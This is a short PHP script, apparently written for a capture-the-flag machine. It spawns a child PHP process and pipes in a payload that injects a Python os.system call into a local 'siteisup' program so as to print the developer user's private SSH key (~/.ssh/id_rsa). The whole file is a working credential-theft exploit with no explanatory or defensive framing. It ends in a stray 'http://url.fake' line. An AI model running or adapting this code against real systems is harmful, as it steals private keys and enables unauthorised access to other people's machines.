<?php
  
  // This code is the parent process

  // bi-directional communication
  $descriptors = array(
    0 => array("pipe", "r"),                         // allows to read (r) input from parent 
    1 => array("pipe", "w")                          // allows to write (w) output from parent
  );

  $process = proc_open("php", $descriptors, $pipes); // create php child process
  
  $payload = "<?php proc_close(proc_open('echo \"__import__(\'os\').system(\'cat /home/developer/.ssh/id_rsa\')\" | /home/developer/dev/siteisup 2>/dev/null', array(), \$something)); ?>";

  if (is_resource($process)){
    // php code to extract id_rsa (developer)
    fwrite($pipes[0], $payload);
    fclose($pipes[0]);

    echo stream_get_contents($pipes[1]);             // show output command 
    fclose($pipes[1]);
    
    proc_close($process);             
  }

?>
http://url.fake
